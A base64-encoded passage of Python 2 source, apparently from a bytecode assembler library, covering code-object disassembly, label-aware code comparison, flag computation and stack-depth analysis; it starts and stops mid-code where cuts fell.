ICAgaWYgaSBpbiBsYWJlbHM6CiAgICAgICAgICAgICAgICBjb2RlLmFwcGVuZCgobGFiZWxzW2ldLCBOb25lKSkKICAgICAgICAgICAgaWYgaSBpbiBsaW5lc3RhcnRzOgogICAgICAgICAgICAgICAgY29kZS5hcHBlbmQoKFNldExpbmVubywgbGluZXN0YXJ0c1tpXSkpCiAgICAgICAgICAgIGkgKz0gMQogICAgICAgICAgICBpZiBvcCBpbiBoYXNjb2RlOgogICAgICAgICAgICAgICAgbGFzdG9wLCBsYXN0YXJnID0gY29kZVstMV0KICAgICAgICAgICAgICAgIGlmIGxhc3RvcCAhPSBMT0FEX0NPTlNUOgogICAgICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IsIFwKICAgICAgICAgICAgICAgICAgICAgICAgIiVzIHNob3VsZCBiZSBwcmVjZWRlZCBieSBMT0FEX0NPTlNUIGNvZGUiICUgb3AKICAgICAgICAgICAgICAgIGNvZGVbLTFdID0gKExPQURfQ09OU1QsIENvZGUuZnJvbV9jb2RlKGxhc3RhcmcpKQogICAgICAgICAgICBpZiBvcCBub3QgaW4gaGFzYXJnOgogICAgICAgICAgICAgICAgY29kZS5hcHBlbmQoKG9wLCBOb25lKSkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGFyZyA9IG9yZChjb19jb2RlW2ldKSArIG9yZChjb19jb2RlW2kgKyAxXSkgKiAyNTYgKyBleHRlbmRlZF9hcmcKICAgICAgICAgICAgICAgIGV4dGVuZGVkX2FyZyA9IDAKICAgICAgICAgICAgICAgIGkgKz0gMgogICAgICAgICAgICAgICAgaWYgb3AgPT0gb3Bjb2RlLkVYVEVOREVEX0FSRzoKICAgICAgICAgICAgICAgICAgICBleHRlbmRlZF9hcmcgPSBhcmcgPDwgMTYKICAgICAgICAgICAgICAgIGVsaWYgb3AgaW4gaGFzY29uc3Q6CiAgICAgICAgICAgICAgICAgICAgY29kZS5hcHBlbmQoKG9wLCBjby5jb19jb25zdHNbYXJnXSkpCiAgICAgICAgICAgICAgICBlbGlmIG9wIGluIGhhc25hbWU6CiAgICAgICAgICAgICAgICAgICAgY29kZS5hcHBlbmQoKG9wLCBjby5jb19uYW1lc1thcmddKSkKICAgICAgICAgICAgICAgIGVsaWYgb3AgaW4gaGFzamFiczoKICAgICAgICAgICAgICAgICAgICBjb2RlLmFwcGVuZCgob3AsIGxhYmVsc1thcmddKSkKICAgICAgICAgICAgICAgIGVsaWYgb3AgaW4gaGFzanJlbDoKICAgICAgICAgICAgICAgICAgICBjb2RlLmFwcGVuZCgob3AsIGxhYmVsc1tpICsgYXJnXSkpCiAgICAgICAgICAgICAgICBlbGlmIG9wIGluIGhhc2xvY2FsOgogICAgICAgICAgICAgICAgICAgIGNvZGUuYXBwZW5kKChvcCwgY28uY29fdmFybmFtZXNbYXJnXSkpCiAgICAgICAgICAgICAgICBlbGlmIG9wIGluIGhhc2NvbXBhcmU6CiAgICAgICAgICAgICAgICAgICAgY29kZS5hcHBlbmQoKG9wLCBjbXBfb3BbYXJnXSkpCiAgICAgICAgICAgICAgICBlbGlmIG9wIGluIGhhc2ZyZWU6CiAgICAgICAgICAgICAgICAgICAgY29kZS5hcHBlbmQoKG9wLCBjZWxsZnJlZVthcmddKSkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgY29kZS5hcHBlbmQoKG9wLCBhcmcpKQoKICAgICAgICB2YXJhcmdzID0gYm9vbChjby5jb19mbGFncyAmIENPX1ZBUkFSR1MpCiAgICAgICAgdmFya3dhcmdzID0gYm9vbChjby5jb19mbGFncyAmIENPX1ZBUktFWVdPUkRTKQogICAgICAgIG5ld2xvY2FscyA9IGJvb2woY28uY29fZmxhZ3MgJiBDT19ORVdMT0NBTFMpCiAgICAgICAgYXJncyA9IGNvLmNvX3Zhcm5hbWVzWzpjby5jb19hcmdjb3VudCArIHZhcmFyZ3MgKyB2YXJrd2FyZ3NdCiAgICAgICAgaWYgY28uY29fY29uc3RzIGFuZCBpc2luc3RhbmNlKGNvLmNvX2NvbnN0c1swXSwgYmFzZXN0cmluZyk6CiAgICAgICAgICAgIGRvY3N0cmluZyA9IGNvLmNvX2NvbnN0c1swXQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGRvY3N0cmluZyA9IE5vbmUKICAgICAgICByZXR1cm4gY2xzKGNvZGU9Y29kZSwKICAgICAgICAgICAgICAgICAgIGZyZWV2YXJzPWNvLmNvX2ZyZWV2YXJzLAogICAgICAgICAgICAgICAgICAgYXJncz1hcmdzLAogICAgICAgICAgICAgICAgICAgdmFyYXJncz12YXJhcmdzLAogICAgICAgICAgICAgICAgICAgdmFya3dhcmdzPXZhcmt3YXJncywKICAgICAgICAgICAgICAgICAgIG5ld2xvY2Fscz1uZXdsb2NhbHMsCiAgICAgICAgICAgICAgICAgICBuYW1lPWNvLmNvX25hbWUsCiAgICAgICAgICAgICAgICAgICBmaWxlbmFtZT1jby5jb19maWxlbmFtZSwKICAgICAgICAgICAgICAgICAgIGZpcnN0bGluZW5vPWNvLmNvX2ZpcnN0bGluZW5vLAogICAgICAgICAgICAgICAgICAgZG9jc3RyaW5nPWRvY3N0cmluZywKICAgICAgICApCgogICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcik6CiAgICAgICAgaWYgKHNlbGYuZnJlZXZhcnMgIT0gb3RoZXIuZnJlZXZhcnMgb3IKICAgICAgICAgICAgICAgICAgICBzZWxmLmFyZ3MgIT0gb3RoZXIuYXJncyBvcgogICAgICAgICAgICAgICAgICAgIHNlbGYudmFyYXJncyAhPSBvdGhlci52YXJhcmdzIG9yCiAgICAgICAgICAgICAgICAgICAgc2VsZi52YXJrd2FyZ3MgIT0gb3RoZXIudmFya3dhcmdzIG9yCiAgICAgICAgICAgICAgICAgICAgc2VsZi5uZXdsb2NhbHMgIT0gb3RoZXIubmV3bG9jYWxzIG9yCiAgICAgICAgICAgICAgICAgICAgc2VsZi5uYW1lICE9IG90aGVyLm5hbWUgb3IKICAgICAgICAgICAgICAgICAgICBzZWxmLmZpbGVuYW1lICE9IG90aGVyLmZpbGVuYW1lIG9yCiAgICAgICAgICAgICAgICAgICAgc2VsZi5maXJzdGxpbmVubyAhPSBvdGhlci5maXJzdGxpbmVubyBvcgogICAgICAgICAgICAgICAgICAgIHNlbGYuZG9jc3RyaW5nICE9IG90aGVyLmRvY3N0cmluZyBvcgogICAgICAgICAgICAgICAgICAgIGxlbihzZWxmLmNvZGUpICE9IGxlbihvdGhlci5jb2RlKQogICAgICAgICk6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQoKICAgICAgICAjIENvbXBhcmUgY29kZS4gVGhpcyBpc24ndCB0cml2aWFsIGJlY2F1c2UgbGFiZWxzIHNob3VsZCBiZSBtYXRjaGluZywKICAgICAgICAjIG5vdCBlcXVhbC4KICAgICAgICBsYWJlbG1hcHBpbmcgPSB7fQogICAgICAgIGZvciAob3AxLCBhcmcxKSwgKG9wMiwgYXJnMikgaW4gaXRlcnRvb2xzLml6aXAoc2VsZi5jb2RlLCBvdGhlci5jb2RlKToKICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShvcDEsIExhYmVsKToKICAgICAgICAgICAgICAgIGlmIGxhYmVsbWFwcGluZy5zZXRkZWZhdWx0KG9wMSwgb3AyKSBpcyBub3Qgb3AyOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgaWYgb3AxICE9IG9wMjoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICAgICAgICAgIGlmIG9wMSBpbiBoYXNqdW1wOgogICAgICAgICAgICAgICAgICAgIGlmIGxhYmVsbWFwcGluZy5zZXRkZWZhdWx0KGFyZzEsIGFyZzIpIGlzIG5vdCBhcmcyOgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICAgICAgICAgIGVsaWYgb3AxIGluIGhhc2FyZzoKICAgICAgICAgICAgICAgICAgICBpZiBhcmcxICE9IGFyZzI6CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgIHJldHVybiBUcnVlCgogICAgZGVmIF9jb21wdXRlX2ZsYWdzKHNlbGYpOgogICAgICAgIG9wY29kZXMgPSBzZXQob3AgZm9yIG9wLCBhcmcgaW4gc2VsZi5jb2RlIGlmIGlzb3Bjb2RlKG9wKSkKCiAgICAgICAgb3B0aW1pemVkID0gKFNUT1JFX05BTUUgbm90IGluIG9wY29kZXMgYW5kCiAgICAgICAgICAgICAgICAgICAgIExPQURfTkFNRSBub3QgaW4gb3Bjb2RlcyBhbmQKICAgICAgICAgICAgICAgICAgICAgREVMRVRFX05BTUUgbm90IGluIG9wY29kZXMpCiAgICAgICAgZ2VuZXJhdG9yID0gKFlJRUxEX1ZBTFVFIGluIG9wY29kZXMpCiAgICAgICAgbm9mcmVlID0gbm90IChvcGNvZGVzLmludGVyc2VjdGlvbihoYXNmcmVlKSkKCiAgICAgICAgZmxhZ3MgPSAwCiAgICAgICAgaWYgb3B0aW1pemVkOiBmbGFncyB8PSBDT19PUFRJTUlaRUQKICAgICAgICBpZiBzZWxmLm5ld2xvY2FsczogZmxhZ3MgfD0gQ09fTkVXTE9DQUxTCiAgICAgICAgaWYgc2VsZi52YXJhcmdzOiBmbGFncyB8PSBDT19WQVJBUkdTCiAgICAgICAgaWYgc2VsZi52YXJrd2FyZ3M6IGZsYWdzIHw9IENPX1ZBUktFWVdPUkRTCiAgICAgICAgaWYgZ2VuZXJhdG9yOiBmbGFncyB8PSBDT19HRU5FUkFUT1IKICAgICAgICBpZiBub2ZyZWU6IGZsYWdzIHw9IENPX05PRlJFRQogICAgICAgIHJldHVybiBmbGFncwoKICAgIGRlZiBfY29tcHV0ZV9zdGFja3NpemUoc2VsZik6CiAgICAgICAgIiIiR2V0IGEgY29kZSBsaXN0LCBjb21wdXRlIGl0cyBtYXhpbWFsIHN0YWNrIHVzYWdlLiIiIgogICAgICAgICMgVGhpcyBpcyBkb25lIGJ5IHNjYW5uaW5nIHRoZSBjb2RlLCBhbmQgY29tcHV0aW5nIGZvciBlYWNoIG9wY29kZQogICAgICAgICMgdGhlIHN0YWNrIHN0YXRlIGF0IHRoZSBvcGNvZGUuCiAgICAgICAgY29kZSA9IHNlbGYuY29kZQoKICAgICAgICAjIEEgbWFwcGluZyBmcm9tIGxhYmVscyB0byB0aGVpciBwb3NpdGlvbnMgaW4gdGhlIGNvZGUgbGlzdAogICAgICAgIGxhYmVsX3BvcyA9IGRpY3QoKG9wLCBwb3MpCiAgICAgICAgICAgIGZvciBwb3MsIChvcCwgYXJnKSBpbiBlbnVtZXJhdGUoY29kZSkKICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShvcCwgTGFiZWwpKQoKICAgICAgICAjIHNmX3RhcmdldHMgYXJlIHRoZSB0YXJnZXRzIG9mIFNFVFVQX0ZJTkFMTFkgb3Bjb2Rlcy4gVGhleSBhcmUgcmVjb3JkZWQKICAgICAgICAjIGJlY2F1c2UgdGhleSBoYXZlIHNwZWNpYWwgc3RhY2sgYmVoYXZpb3VyLiBJZiBhbiBleGNlcHRpb24gd2FzIHJhaXNlZAogICAgICAgICMgaW4gdGhlIGJsb2NrIHB1c2hlZCBieSBhIFNFVFVQX0ZJTkFMTFkgb3Bjb2RlLCB0aGUgYmxvY2sgaXMgcG9wcGVkCiAgICAgICAgIyBhbmQgMyBvYmplY3RzIGFyZSBwdXNoZWQuIE9uIHJldHVybiBvciBjb250aW51ZSwgdGhlIGJsb2NrIGlzIHBvcHBlZAogICAgICAgICMgYW5kIDIgb2JqZWN0cyBhcmUgcHVzaGVkLiBJZiBub3RoaW5nIGhhcHBlbmVkLCB0aGUgYmxvY2sgaXMgcG9wcGVkIGJ5CiAgICAgICAgIyBhIFBPUF9CTE9DSyBvcGNvZGUgYW5kIDEgb2JqZWN0IGlzIHB1c2hlZCBieSBhIChMT0FEX0NPTlNULCBOb25lKQogICAgICAgICMgb3BlcmF0aW9uLgogICAgICAgICMKICAgICAgICAjIE91ciBzb2x1dGlvbiBpcyB0byByZWNvcmQgdGhlIHN0YWNrIHN0YXRlIG9mIFNFVFVQX0ZJTkFMTFkgdGFyZ2V0cwogICAgICAgICMgYXMgaGF2aW5nIDMgb2JqZWN0cyBwdXNoZWQsIHdoaWNoIGlzIHRoZSBtYXhpbXVtLiBIb3dldmVyLCB0byBtYWtlCiAgICAgICAgIyBzdGFjayByZWNvcmRpbmcgY29uc2lzdGVudCwgdGhlIGdldF9uZXh0X3N0YWNrcyBmdW5jdGlvbiB3aWxsIGFsd2F5cwogICAgICAgICMgeWllbGQgdGhlIHN0YWNrIHN0YXRlIG9mIHRoZSB0YXJnZXQgYXMgaWYgMSBvYmplY3Qgd2FzIHB1c2hlZCwgYnV0CiAgICAgICAgIyB0aGlzIHdpbGwgYmUgY29ycmVjdGVkIGluIHRoZSBhY3R1YWwgc3RhY2sgcmVjb3JkaW5nLgoKICAgICAgICBzZl90YXJnZXRzID0gc2V0KGxhYmVsX3Bvc1thcmddCiAgICAgICAgICAgIGZvciBvcCwgYXJnIGluIGNvZGUKICAgICAgICAgICAgaWYgb3AgPT0gU0VUVVBfRklOQUxMWSkKCiAgICAgICAgIyBXaGF0IHdlIGNvbXB1dGUgLSBmb3IgZWFjaCBvcGNvZGUsIGl0cyBzdGFjayBzdGF0ZSwgYXMgYW4gbi10dXBsZS4KICAgICAgICAjIG4gaXMgdGhlIG51bWJlciBvZiBibG9ja3MgcHVzaGVkLiBGb3IgZWFjaCBibG9jaywgd2UgcmVjb3JkIHRoZSBudW1iZXIKICAgICAgICAjIG9mIG9iamVjdHMgcHVzaGVkLgogICAgICAgIHN0YWNrcyA9IFtOb25lXSAqIGxlbihjb2RlKQoKICAgICAgICBkZWYgZ2V0X25leHRfc3RhY2tzKHBvcywgY3Vyc3RhY2spOgogICAgICAgICAgICAiIiJHZXQgYSBjb2RlIHBvc2l0aW9uIGFuZCB0aGUgc3RhY2sgc3RhdGUgYmVmb3JlIHRoZSBvcGVyYXRpb24KICAgICAgICAgICAgd2FzIGRvbmUsIGFuZCB5aWVsZCBwYWlycyAocG9zLCBjdXJzdGFjaykgZm9yIHRoZSBuZXh0IHBvc2l0aW9ucwogICAgICAgICAgICB0byBiZSBleHBsb3JlZCAtIHRob3NlIGFyZSB0aGUgcG9zaXRpb25zIHRvIHdoaWNoIHlvdSBjYW4gZ2V0CiAgICAgICAgICAgIGZyb20gdGhlIGdpdmVuIChwb3MsIGN1cnN0YWNrKS4KCiAgICAgICAgICAgIElmIHRoZSBnaXZlbiBwb3NpdGlvbiB3YXMgYWxyZWFkeSBleHBsb3JlZCwgbm90aGluZyB3aWxsIGJlIHlpZWxkZWQuCiAgICAgICAgICAgICIiIgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBvcCwgYXJnID0gY29kZVtwb3NdCiAgICAgICAgICAgIGV4Y2VwdCBJbmRleEVycm9yOgogICAgICAgICAgICAgICAgI3ByaW50ICJJZ25vcmluZyBJbmRleEVycm9yIgogICAgICAgICAgICAgICAgcmV0dXJuCgogICAgICAgICAgICBpZiBpc2luc3RhbmNlKG9wLCBMYWJlbCk6CiAgICAgICAgICAgICAgICAjIFdlIHNob3VsZCBjaGVjayBpZiB3ZSBhbHJlYWR5IHJlYWNoZWQgYSBub2RlIG9ubHkgaWYgaXQgaXMKICAgICAgICAgICAgICAgICMgYSBsYWJlbC4KICAgICAgICAgICAgICAgIGlmIHBvcyBpbiBzZl90YXJnZXRzOgogICAgICAgICAgICAgICAgICAgIGN1cnN0YWNrID0gY3Vyc3RhY2tbOi0xXSArIChjdXJzdGFja1stMV0gKyAyLCkKICAgICAgICAgICAgICAgIGlmIHN0YWNrc1twb3NdIGlzIE5vbmU6CiAgICAgICAgICAgICAgICAgICAgc3RhY2tzW3Bvc10gPSBjdXJzdGFjawogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBpZiBzdGFja3NbcG9zXSAhPSBjdXJzdGFjazoKICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvciwgIkluY29uc2lzdGVudCBjb2RlIgogICAgICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgZGVmIG5ld3N0YWNrKG4pOgogICAgICAgICAgICAgICAgIyBSZXR1cm4gYSBuZXcgc3RhY2ssIG1vZGlmaWVkIGJ5IGFkZGluZyBuIGVsZW1lbnRzIHRvIHRoZSBsYXN0CiAgICAgICAgICAgICAgICAjIGJsb2NrCiAgICAgICAgICAgICAgICBpZiBjdXJzdGFja1stMV0gKyBuIDwgMDoKICAgICAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yLCAiUG9wcGVkIGEgbm9uLWV4aXN0aW5nIGVsZW1lbnQiCiAgICAgICAgICAgICAgICByZXR1cm4gY3Vyc3RhY2tbOi0xXSArIChjdXJzdGFja1stMV0gKyBuLCkKCiAgICAgICAgICAgIGlmIG5vdCBpc29wY29kZShvcCk6CiAgICAgICAgICAgICAgICAjIGxhYmVsIG9yIFNldExpbmVubyAtIGp1c3QgY29udGludWUgdG8gbmV4dCBsaW5lCiAgICAgICAgICAgICAgICB5aWVsZCBwb3MgKyAxLCBjdXJzdGFjawoKICAgICAgICAgICAgZWxpZiBvcCBpbiAoU1RPUF9DT0RFLCBSRVRVUk5fVkFMVUUsIFJBSVNFX1ZBUkFSR1MpOgogICAgICAgICAgICAgICAgIyBObyBwbGFjZSBpbiBwYXJ0aWN1bGFyIHRvIGNvbnRpbnVlIHRvCiAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICBlbGlmIG9wID09IE1BS0VfQ0xPU1VSRSBhbmQgcHl0aG9uX3ZlcnNpb24gPT0gJzIuNCc6CiAgICAgICAgICAgICAgICAjIFRoaXMgaXMgb25seSByZWxldmFudCBpbiBQeXRob24gMi40IC0gaW4gUHl0aG9uIDIuNSB0aGUgc3RhY2sKICAgICAgICAgICAgICAgICMgZWZmZWN0IG9mIE1BS0VfQ0xPU1VSRSBjYW4gYmUgY2FsY3VsYXRlZCBmcm9tIHRoZSBhcmcuCiAgICAgICAgICAgICAgICAjIEluIFB5dGhvbiAyLjQsIGl0IGRlcGVuZHMgb24gdGhlIG51bWJlciBvZiBmcmVldmFycyBvZiBUT1MsCiAgICAgICAgICAgICAgICAjIHdoaWNoIHNob3VsZCBiZSBhIGNvZGUgb2JqZWN0LgogICAgICAgICAgICAgICAgaWYgcG9zID09IDA6CiAgICAgICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvciwgXAogICAgICAgICAgICAgICAgICAgICAgICAiTUFLRV9DTE9TVVJFIGNhbid0IGJlIHRoZSBmaXJzdCBvcGNvZGUiCiAgICAgICAgICAgICAgICBsYXN0b3AsIGxhc3RhcmcgPSBjb2RlW3BvcyAtIDFdCiAgICAgICAgICAgICAgICBpZiBsYXN0b3AgIT0gTE9BRF9DT05TVDoKICAgICAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yLCBcCiAgICAgICAgICAgICAgICAgICAgICAgICJNQUtFX0NMT1NVUkUgc2hvdWxkIGNvbWUgYWZ0ZXIgYSBMT0FEX0NPTlNUIG9wIgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIG5leHRyYXBvcHMgPSBsZW4obGFzdGFyZy5mcmVldmFycykKICAgICAgICAgICAgICAgIGV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIG5leHRyYXBvcHMgPSBsZW4obGFzdGFyZy5jb19mcmVldmFycykKICAgICAgICAgICAgICAgICAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IsIFwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJNQUtFX0NMT1NVUkUgcHJlY2VkaW5nIGNvbnN0IHNob3VsZCAiIFwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJiZSBhIGNvZGUgb3IgYSBDb2RlIG9iamVjdCIKCiAgICAgICAgICAgICAgICB5aWVsZCBwb3MgKyAxLCBuZXdzdGFjaygtYXJnIC0gbmV4dHJhcG9wcykKCiAgICAgICAgICAgIGVsaWYgb3Agbm90IGluIGhhc2Zsb3c6CiAgICAgICAgICAgICAgICAjIFNpbXBsZSBjaGFuZ2Ugb2Ygc3RhY2sKICAgICAgICAgICAgICAgIHBvcCwgcHVzaCA9IGdldHNlKG9wLCBhcmcpCiAgICAgICAgICAgICAgICB5aWVsZCBwb3MgKyAxLCBuZXdzdGFjayhwdXNoIC0gcG9wKQoKICAgICAgICAgICAgZWxpZiBvcCBpbiAoSlVNUF9GT1JXQVJELCBKVU1QX0FCU09MVVRFKToKICAgICAgICAgICAgICAgICMgT25lIHBvc3NpYmlsaXR5IGZvciBhIGp1bXAKICAgICAgICAgICAgICAgIHlpZWxkIGxhYmVsX3Bvc1thcmddLCBjdXJzdGFjawoKICAgICAgICAgICAgZWxpZiBweXRob25fdmVyc2lvbiA8ICcyLjcnIGFuZCBvcCBpbiAoSlVNUF9JRl9GQUxTRSwgSlVNUF9JRl9UUlVFKToKICAgICAgICAgICAgICAgICMgVHdvIHBvc3NpYmlsaXRpZXMgZm9yIGEganVtcAogICAgICAgICAgICAgICAgeWllbGQgbGFiZWxfcG9zW2FyZ10sIGN1cnN0YWNrCiAgICAgICAgICAgICAgICB5aWVsZCBwb3MgKyAxLCBjdXJzdGFjawoKICAgICAgICAgICAgZWxpZiBweXRob25fdmVyc2lvbiA+PSAnMi43JyBhbmQgb3AgaW4gKFBPUF9KVU1QX0lGX0ZBTFNFLCBQT1BfSlVNUF9JRl9UUlVFKToKICAgICAgICAgICAgICAgICMgVHdvIHBvc3NpYmlsaXRpZXMgZm9yIGEganVtcAogICAgICAgICAgICAgICAgeWllbGQgbGFiZWxfcG9zW2FyZ10sIG5ld3N0YWNrKC0xKQogICAgICAgICAgICAgICAgeWllbGQgcG9zICsgMSwgbmV3c3RhY2soLTEpCgogICAgICAgICAgICBlbGlmIHB5dGhvbl92ZXJzaW9uID49ICcyLjcnIGFuZCBvcCBpbiAoSlVNUF9JRl9UUlVFX09SX1BPUCwgSlVNUF9JRl9GQUxTRV9PUl9QT1ApOgogICAgICAgICAgICAgICAgIyBUd28gcG9zc2liaWxpdGllcyBmb3IgYSBqdW1wCiAgICAgICAgICAgICAgICB5aWVsZCBsYWJlbF9wb3NbYXJnXSwgY3Vyc3RhY2sKICAgICAgICAgICAgICAgIHlpZWxkIHBvcyArIDEsIG5ld3N0YWNrKC0xKQoKICAgICAgICAgICAgZWxpZiBvcCA9PSBGT1JfSVRFUjoKICAgICAgICAgICAgICAgICMgRk9SX0lURVIgcHVzaGVzIG5leHQoVE9TKSBvbiBzdWNjZXNzLCBhbmQgcG9wcyBUT1MgYW5kIGp1bXBzCiAgICAgICAgICAgICAgICAjIG9uIGZhaWx1cmUKICAgICAgICAgICAgICAgIHlpZWxkIGxhYmVsX3Bvc1thcmddLCBuZXdzdGFjaygtMSkKICAgICAgICAgICAgICAgIHlpZWxkIHBvcyArIDEsIG5ld3N0YWNrKDEpCgogICAgICAgICAgICBlbGlmIG9wID09IEJSRUFLX0xPT1A6CiAgICAgICAgICAgICAgICAjIEJSRUFLX0xPT1AganVtcHMgdG8gYSBwbGFjZSBzcGVjaWZpZWQgb24gYmxvY2sgY3JlYXRpb24sIHNvCiAgICAgICAgICAgICAgICAjIGl0IGlzIGlnbm9yZWQgaGVyZQogICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgZWxpZiBvcCA9PSBDT05USU5VRV9MT09QOgogICAgICAgICAgICAgICAgIyBDT05USU5VRV9MT09QIGp1bXBzIHRvIHRoZSBiZWdpbm5pbmcgb2YgYSBsb29wIHdoaWNoIHNob3VsZAogICAgICAgICAgICAgICAgIyBhbHJlYWR5IGF2ZSBiZWVuIGRpc2NvdmVyZWQsIGJ1dCB3ZSB2ZXJpZnkgYW55d2F5LgogICAgICAgICAgICAgICAgIyBJdCBwb3BzIGEgYmxvY2suCiAgICAgICAgICAgICAgICBpZiBweXRob25fdmVyc2lvbiA9PSAnMi42JzoKICAgICAgICAgICAgICAgICAgICBwb3MsIHN0YWNrID0gbGFiZWxfcG9zW2FyZ10sIGN1cnN0YWNrWzotMV0KICAgICAgICAgICAgICAgICAgICBpZiBzdGFja3NbcG9zXSAhPSBzdGFjazogI3RoaXMgY291bGQgYmUgYSBsb29wIHdpdGggYSAnd2l0aCcgaW5zaWRlCiAgICAgICAgICAgICAgICAgICAgICAgIHlpZWxkIHBvcywgc3RhY2tbOi0xXSArIChzdGFja1stMV0gLSAxLCkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICB5aWVsZCBwb3MsIHN0YWNrCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHlpZWxkIGxhYmVsX3Bvc1thcmddLCBjdXJzdGFja1s6LTFdCgogICAgICAgICAgICBlbGlmIG9wID09IFNFVFVQX0xPT1A6CiAgICAgICAgICAgICAgICAjIFdlIGNvbnRpbnVlIHdpdGggYSBuZXcgYmxvY2suCiAgICAgICAgICAgICAgICAjIE9uIGJyZWFrLCB3ZSBqdW1wIHRvIHRoZSBsYWJlbCBhbmQgcmV0dXJuIHRvIGN1cnJlbnQgc3RhY2sKICAgICAgICAgICAgICAgICMgc3RhdGUuCiAgICAgICAgICAgICAgICB5aWVsZCBsYWJlbF9wb3NbYXJnXSwgY3Vyc3RhY2sKICAgICAgICAgICAgICAgIHlpZWxkIHBvcyArIDEsIGN1cnN0YWNrICsgKDAsKQoKICAgICAgICAgICAgZWxpZiBvcCA9PSBTRVRVUF9FWENFUFQ6CiAgICAgICAgICAgICAgICAjIFdlIGNvbnRpbnVlIHdpdGggYSBuZXcgYmxvY2suCiAgICAgICAgICAgICAgICAjIE9uIGV4Y2VwdGlvbiwgd2UganVtcCB0byB0aGUgbGFiZWwgd2l0aCAzIGV4dHJhIG9iamVjdHMgb24KICAgICAgICAgICAgICAgICMgc3RhY2sKICAgICAgICAgICAgICAgIHlpZWxkIGxhYmVsX3Bvc1thcmddLCBuZXdzdGFjaygzKQogICAgICAgICAgICAgICAgeWllbGQgcG9zICsgMSwgY3Vyc3RhY2sgKyAoMCwpCgogICAgICAgICAgICBlbGlmIG9wID09IFNFVFVQX0ZJTkFMTFk6CiAgICAgICAgICAgICAgICAjIFdlIGNvbnRpbnVlIHdpdGggYSBuZXcgYmxvY2suCiAgICAgICAgICAgICAgICAjIE9uIGV4Y2VwdGlvbiwgd2UganVtcCB0byB0aGUgbGFiZWwgd2l0aCAzIGV4dHJhIG9iamVjdHMgb24KICAgICAgICAgICAgICAgICMgc3RhY2ssIGJ1dCB0byBrZWVwIHN0YWNrIHJlY29yZGluZyBjb25zaXN0ZW50LCB3ZSBiZWhhdmUgYXMKICAgICAgICAgICAgICAgICMgaWYgd2UgYWRkIG9ubHkgMSBvYmplY3QuIEV4dHJhIDIgd2lsbCBiZSBhZGRlZCB0byB0aGUgYWN0dWFsCiAgICAgICAgICAgICAgICAjIHJlY29yZGluZy4KICAgICAgICAgICAgICAgIHlpZWxkIGxhYmVsX3Bvc1thcmddLCBuZXdzdGFjaygxKQogICAgICAgICAgICAgICAgeWllbGQgcG9zICsgMSwgY3Vyc3RhY2sgKyAoMCwpCgogICAgICAgICAgICBlbGlmIHB5dGhvbl92ZXJzaW9uID09ICcyLjcnIGFuZCBvcCA9PSBTRVRVUF9XSVRIOgogICAgICAgICAgICAgICAgeWllbGQgbGFiZWxfcG9zW2FyZ10sIGN1cnN0YWNrCiAgICAgICAgICAgICAgICB5aWVsZCBwb3MgKyAxLCBuZXdzdGFjaygtMSkgKyAoMSwpCgogICAgICAgICAgICBlbGlmIG9wID09IFBPUF9CTE9DSzoKICAgICAgICAgICAgICAgICMgSnVzdCBwb3AgdGhlIGJsb2NrCiAgICAgICAgICAgICAgICB5aWVsZCBwb3MgKyAxLCBjdXJzdGFja1s6LTFdCgogICAgICAgICAgICBlbGlmIG9wID09IEVORF9GSU5BTExZOgogICAgICAgICAgICAgICAgIyBTaW5jZSBzdGFjayByZWNvcmRpbmcgb2YgU0VUVVBfRklOQUxMWSB0YXJnZXRzIGlzIG9mIDMgcHVzaGVkCiAgICAgICAgICAgICAgICAjIG9iamVjdHMgKGFzIHdoZW4gYW4gZXhjZXB0aW9uIGlzIHJhaXNlZCksIHdlIHBvcCAzIG9iamVjdHMuCiAgICAgICAgICAgICAgICB5aWVsZCBwb3MgKyAxLCBuZXdzdGFjaygtMykKCiAgICAgICAgICAgIGVsaWYgb3AgPT0gV0lUSF9DTEVBTlVQOgogICAgICAgICAgICAgICAgIyBTaW5jZSBXSVRIX0NMRUFOVVAgaXMgYWx3YXlzIGZvdW5kIGFmdGVyIFNFVFVQX0ZJTkFMTFkKICAgICAgICAgICAgICAgICMgdGFyZ2V0cywgYW5kIHRoZSBzdGFjayByZWNvcmRpbmcgaXMgdGhhdCBvZiBhIHJhaXNlZAogICAgICAgICAgICAgICAgIyBleGNlcHRpb24sIHdlIGNhbiBzaW1wbHkgcG9wIDEgb2JqZWN0IGFuZCBsZXQgRU5EX0ZJTkFMTFkKICAgICAgICAgICAgICAgICMgcG9wIHRoZSByZW1haW5pbmcgMy4KICAgICAgICAgICAgICAgIGlmIHB5dGhvbl92ZXJza